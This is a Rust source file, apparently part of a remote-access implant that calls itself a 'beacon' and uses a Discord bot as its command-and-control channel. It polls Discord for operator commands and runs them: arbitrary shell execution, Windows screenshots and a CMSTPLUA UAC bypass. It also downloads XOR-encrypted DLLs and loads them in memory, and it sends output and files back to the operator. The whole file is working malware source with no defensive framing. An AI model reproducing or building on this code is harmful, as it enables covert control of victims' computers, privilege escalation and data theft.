//! Discord API client
//!
//! Handles all communication with the Discord REST API.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use reqwest::blocking::multipart::{Form, Part};
use reqwest::blocking::Client;
use reqwest::StatusCode;

#[cfg(windows)]
use crate::commands::capture_screenshot;
use crate::commands::{
    execute_shell_command, execute_uac_bypass, get_help_message, load_dll_from_bytes, Command, CommandResult,
};
use crate::config::Config;
use crate::error::{BeaconError, Result};

use super::models::{Attachment, Channel, CreateChannelRequest, Message, SendMessageRequest, User};

/// Discord API client with blocking HTTP
pub struct DiscordClient {
    /// HTTP client
    client: Client,
    /// Discord API base URL
    api_url: String,
    /// Bot authentication token
    token: String,
    /// Guild ID where the beacon operates
    guild_id: String,
    /// Channel ID for general notifications
    general_channel_id: String,
    /// Polling interval in seconds
    poll_interval_secs: u64,
    /// Bot's own user ID (to filter out our own messages)
    bot_user_id: Option<String>,
    /// XOR key for decryption
    xor_key: Vec<u8>,
}

impl DiscordClient {
    /// Create a new Discord client from configuration
    pub fn from_config(config: &Config) -> Result<Self> {
        let client = Client::builder().timeout(Duration::from_secs(30)).build()?;

        Ok(Self {
            client,
            api_url: config.discord.api_url.clone(),
            token: config.discord.bot_token.clone(),
            guild_id: config.discord.guild_id.clone(),
            general_channel_id: config.discord.general_channel_id.clone(),
            poll_interval_secs: config.settings.poll_interval_secs,
            bot_user_id: None,
            xor_key: config.get_xor_key(),
        })
    }

    /// Build Authorization header value
    fn auth_header(&self) -> String {
        format!("Bot {}", self.token)
    }

    /// Handle rate limiting (HTTP 429)
    fn check_rate_limit(&self, response: &reqwest::blocking::Response) -> Option<u64> {
        if response.status() == StatusCode::TOO_MANY_REQUESTS {
            let retry_after = response
                .headers()
                .get("Retry-After")
                .and_then(|v| v.to_str().ok())
                .and_then(|v| v.parse::<u64>().ok())
                .unwrap_or(5);
            Some(retry_after)
        } else {
            None
        }
    }

    /// Execute a request with automatic rate limit handling
    fn execute_with_retry<F, T>(&self, mut request_fn: F) -> Result<T>
    where
        F: FnMut() -> Result<reqwest::blocking::Response>,
        T: serde::de::DeserializeOwned,
    {
        loop {
            let response = request_fn()?;

            if let Some(retry_after) = self.check_rate_limit(&response) {
                thread::sleep(Duration::from_secs(retry_after));
                continue;
            }

            if !response.status().is_success() {
                let status = response.status().as_u16();
                let message = response.text().unwrap_or_default();
                return Err(BeaconError::Discord { status, message });
            }

            return response.json::<T>().map_err(BeaconError::from);
        }
    }

    /// Validate the bot token by fetching current user info
    pub fn validate_token(&mut self) -> Result<User> {
        let url = format!("{}/users/@me", self.api_url);
        let auth = self.auth_header();

        let user: User = self.execute_with_retry(|| {
            self.client
                .get(&url)
                .header("Authorization", &auth)
                .send()
                .map_err(BeaconError::from)
        })?;

        self.bot_user_id = Some(user.id.clone());
        Ok(user)
    }

    /// Get all channels in the guild
    pub fn get_guild_channels(&self) -> Result<Vec<Channel>> {
        let url = format!("{}/guilds/{}/channels", self.api_url, self.guild_id);
        let auth = self.auth_header();

        self.execute_with_retry(|| {
            self.client
                .get(&url)
                .header("Authorization", &auth)
                .send()
                .map_err(BeaconError::from)
        })
    }

    /// Find a channel by name (case-insensitive)
    pub fn find_channel_by_name(&self, name: &str) -> Result<Option<Channel>> {
        let channels = self.get_guild_channels()?;
        let name_lower = name.to_lowercase();

        Ok(channels.into_iter().find(|c| {
            c.name
                .as_ref()
                .map(|n| n.to_lowercase() == name_lower)
                .unwrap_or(false)
        }))
    }

    /// Get an existing channel by name, or create it if it doesn't exist
    pub fn get_or_create_channel(&self, name: &str) -> Result<(Channel, bool)> {
        match self.find_channel_by_name(name)? {
            Some(channel) => Ok((channel, false)),
            None => {
                let channel = self.create_channel(name)?;
                Ok((channel, true))
            }
        }
    }

    /// Create a new text channel with the given name
    pub fn create_channel(&self, name: &str) -> Result<Channel> {
        let url = format!("{}/guilds/{}/channels", self.api_url, self.guild_id);
        let auth = self.auth_header();

        let body = CreateChannelRequest {
            name: name.to_string(),
            channel_type: 0,
        };

        self.execute_with_retry(|| {
            self.client
                .post(&url)
                .header("Authorization", &auth)
                .header("Content-Type", "application/json")
                .json(&body)
                .send()
                .map_err(BeaconError::from)
        })
    }

    /// Send a message to a channel
    pub fn send_message(&self, channel_id: &str, content: &str) -> Result<Message> {
        let url = format!("{}/channels/{}/messages", self.api_url, channel_id);
        let auth = self.auth_header();

        let body = SendMessageRequest {
            content: content.to_string(),
        };

        self.execute_with_retry(|| {
            self.client
                .post(&url)
                .header("Authorization", &auth)
                .header("Content-Type", "application/json")
                .json(&body)
                .send()
                .map_err(BeaconError::from)
        })
    }

    /// Send a file attachment to a channel
    pub fn send_file(&self, channel_id: &str, filename: &str, content: &str) -> Result<Message> {
        let url = format!("{}/channels/{}/messages", self.api_url, channel_id);
        let auth = self.auth_header();

        let file_content = content.to_string();
        let file_name = filename.to_string();

        self.execute_with_retry(|| {
            let file_part = Part::text(file_content.clone())
                .file_name(file_name.clone())
                .mime_str("text/plain; charset=utf-8")
                .map_err(|e| BeaconError::Multipart(e.to_string()))?;

            let form = Form::new().part("files[0]", file_part);

            self.client
                .post(&url)
                .header("Authorization", &auth)
                .multipart(form)
                .send()
                .map_err(BeaconError::from)
        })
    }

    /// Send a binary file attachment to a channel
    pub fn send_binary_file(
        &self,
        channel_id: &str,
        filename: &str,
        data: &[u8],
        mime_type: &str,
    ) -> Result<Message> {
        let url = format!("{}/channels/{}/messages", self.api_url, channel_id);
        let auth = self.auth_header();

        let file_data = data.to_vec();
        let file_name = filename.to_string();
        let file_mime = mime_type.to_string();

        self.execute_with_retry(|| {
            let file_part = Part::bytes(file_data.clone())
                .file_name(file_name.clone())
                .mime_str(&file_mime)
                .map_err(|e| BeaconError::Multipart(e.to_string()))?;

            let form = Form::new().part("files[0]", file_part);

            self.client
                .post(&url)
                .header("Authorization", &auth)
                .multipart(form)
                .send()
                .map_err(BeaconError::from)
        })
    }

    /// Download a file from a URL
    pub fn download_file(&self, url: &str) -> Result<Vec<u8>> {
        let response = self.client.get(url).send().map_err(BeaconError::from)?;

        if !response.status().is_success() {
            return Err(BeaconError::Download(format!(
                "HTTP {}: {}",
                response.status().as_u16(),
                url
            )));
        }

        response
            .bytes()
            .map(|b| b.to_vec())
            .map_err(BeaconError::from)
    }

    /// Fetch the latest message from a channel
    pub fn get_latest_message(&self, channel_id: &str) -> Result<Option<Message>> {
        let url = format!("{}/channels/{}/messages?limit=1", self.api_url, channel_id);
        let auth = self.auth_header();

        let response = self
            .client
            .get(&url)
            .header("Authorization", &auth)
            .send()?;

        if let Some(retry_after) = self.check_rate_limit(&response) {
            return Err(BeaconError::RateLimited { retry_after });
        }

        if !response.status().is_success() {
            let status = response.status().as_u16();
            let message = response.text().unwrap_or_default();
            return Err(BeaconError::Discord { status, message });
        }

        let messages: Vec<Message> = response.json()?;
        Ok(messages.into_iter().next())
    }

    /// Notify in general channel that a host connected
    pub fn notify_connection(&self, hostname: &str, channel_id: &str, is_new: bool) -> Result<()> {
        let content = if is_new {
            format!(
                "Host `{}` connected, channel created: <#{}>",
                hostname, channel_id
            )
        } else {
            format!("Host `{}` reconnected: <#{}>", hostname, channel_id)
        };
        self.send_message(&self.general_channel_id, &content)?;
        Ok(())
    }

    /// Main polling loop - checks for new commands
    pub fn polling_loop(&self, channel_id: &str, running: Arc<AtomicBool>) -> Result<()> {
        let mut last_message_id: Option<String> = None;

        while running.load(Ordering::Relaxed) {
            match self.get_latest_message(channel_id) {
                Ok(Some(msg)) => {
                    let is_new = last_message_id
                        .as_ref()
                        .map(|id| id != &msg.id)
                        .unwrap_or(true);

                    if is_new {
                        let is_from_bot = self
                            .bot_user_id
                            .as_ref()
                            .map(|id| id == &msg.author.id)
                            .unwrap_or(false);

                        if !is_from_bot {
                            let _ = self.process_command(channel_id, &msg);
                        }

                        last_message_id = Some(msg.id);
                    }
                }
                Ok(None) => {}
                Err(BeaconError::RateLimited { retry_after }) => {
                    thread::sleep(Duration::from_secs(retry_after));
                    continue;
                }
                Err(_e) => {}
            }

            thread::sleep(Duration::from_secs(self.poll_interval_secs));
        }

        Ok(())
    }

    /// Send a command result to a channel
    fn send_command_result(&self, channel_id: &str, result: CommandResult) -> Result<()> {
        match result {
            CommandResult::FileOutput { content, filename } => {
                self.send_file(channel_id, &filename, &content)?;
            }
            CommandResult::BinaryOutput {
                data,
                filename,
                mime_type,
            } => {
                self.send_binary_file(channel_id, &filename, &data, &mime_type)?;
            }
            CommandResult::TextResponse(text) => {
                self.send_message(channel_id, &text)?;
            }
            CommandResult::Error(err) => {
                self.send_message(channel_id, &format!("Error: {}", err))?;
            }
        }
        Ok(())
    }

    /// Process a command and execute it
    fn process_command(&self, channel_id: &str, msg: &Message) -> Result<bool> {
        let command = Command::parse(&msg.content);

        match command {
            Command::Shell(cmd) => {
                let result = execute_shell_command(&cmd);
                self.send_command_result(channel_id, result)?;
                Ok(true)
            }
            #[cfg(windows)]
            Command::Screenshot => {
                let result = capture_screenshot();
                self.send_command_result(channel_id, result)?;
                Ok(true)
            }
            #[cfg(not(windows))]
            Command::Screenshot => {
                self.send_message(channel_id, "Screenshot is only supported on Windows")?;
                Ok(true)
            }
            Command::LoadDll(dll_name) => {
                // Handle !loaddll command
                let result = self.handle_loaddll(&msg.attachments, &dll_name);
                self.send_command_result(channel_id, result)?;
                Ok(true)
            }
            Command::UacBypass(cmd) => {
                // Handle !uacbypass command - elevate privileges via CMSTPLUA COM bypass
                let result = execute_uac_bypass(&cmd);
                self.send_command_result(channel_id, result)?;
                Ok(true)
            }
            Command::Help => {
                let result = get_help_message("");
                self.send_command_result(channel_id, result)?;
                Ok(true)
            }
            Command::Unknown(cmd) => {
                let result = get_help_message(&cmd);
                self.send_command_result(channel_id, result)?;
                Ok(true)
            }
        }
    }

    /// Handle the !loaddll command
    /// Downloads the DLL from attachment, decrypts it (XOR), and loads it using PE loader
    fn handle_loaddll(&self, attachments: &[Attachment], dll_name: &str) -> CommandResult {
        // Find the attachment with matching filename, or take the first .dll attachment
        let attachment = attachments.iter().find(|a| {
            if !dll_name.is_empty() {
                a.filename.eq_ignore_ascii_case(dll_name)
            } else {
                a.filename.to_lowercase().ends_with(".dll")
                    || a.filename.to_lowercase().ends_with(".dll.enc")
            }
        });

        let attachment = match attachment {
            Some(a) => a,
            None => {
                return CommandResult::Error(
                    "No DLL attachment found. Attach a .dll or .dll.enc file to your message."
                        .to_string(),
                );
            }
        };

        // Download the file
        let encrypted_bytes = match self.download_file(&attachment.url) {
            Ok(bytes) => bytes,
            Err(e) => return CommandResult::Error(format!("Download failed: {}", e)),
        };

        // Decrypt (XOR)
        let dll_bytes = xor_decrypt(&encrypted_bytes, &self.xor_key);

        // Load the DLL using PE loader
        let result = load_dll_from_bytes(&dll_bytes);

        match result {
            Ok(base_addr) => CommandResult::TextResponse(format!(
                "DLL '{}' loaded successfully at 0x{:X}",
                attachment.filename, base_addr
            )),
            Err(e) => CommandResult::Error(format!("PE load failed: {}", e)),
        }
    }
}

/// XOR decrypt/encrypt bytes with a key
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    if key.is_empty() {
        return data.to_vec();
    }

    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}
